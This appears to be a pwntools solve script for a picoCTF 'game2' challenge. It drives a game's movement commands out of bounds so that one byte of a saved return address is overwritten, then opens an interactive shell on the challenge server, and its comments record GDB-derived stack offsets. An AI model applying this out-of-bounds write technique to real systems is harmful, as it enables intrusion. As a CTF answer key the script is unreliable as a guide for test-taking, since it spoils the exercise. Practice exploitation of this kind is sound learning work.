from pwn import *
port = int(input('port='))
r = remote('saturn.picoctf.net', port)
#r = process('/tmp/game2')
#gdb.attach(r, 'break *0x08049498')
x = 4
y = 4
def changechar(c):
    r.sendline(b'l' + bytes(c))
def change_x(n):
    # x += n
    #print('x+=',n)
    if n < 0:
        r.send(b'w\n' * (-n))
    else:
        r.send(b's\n' * n)
def change_y(n):
    # y += n
    #print('y+=',n)
    if n < 0:
        r.send(b'a\n' * (-n))
    else:
        r.send(b'd\n' * n)
def set_x(n):
    global x
    diff = n - x
    change_x(diff)
    x = n
def set_y(n):
    global y
    diff = n - y
    change_y(diff)
    y = n
def win_game():
    r.sendline(b'p')

# Send payload
# The -0x5a is so that we don't run over the x and y variables
#gdb.attach(r)
#set_x(-1)
#set_y(0x5a - 3 - 0x1f)
#set_y(47)
# We write y before x, because apparently ebp-0x8 inside move_player is used to set esp? 
# (that messed me up the first time)
# at (0,0), $eax-($ebp+4)=0xffffc353-0xffffc32c=39 (confirmed with GDB)
#changechar(b'\x5d')
# fsr 0x5d doesn't work so we'll use one of the bytes in the big chunk of NOPs
changechar(b'\x6f')
set_y(0x5a - 39)
set_x(-1)

# Get the flag!
r.interactive()

#r.interactive()
#win_game()
#while 1: print(r.recvline())
#r.close()
#print(r.recvall())
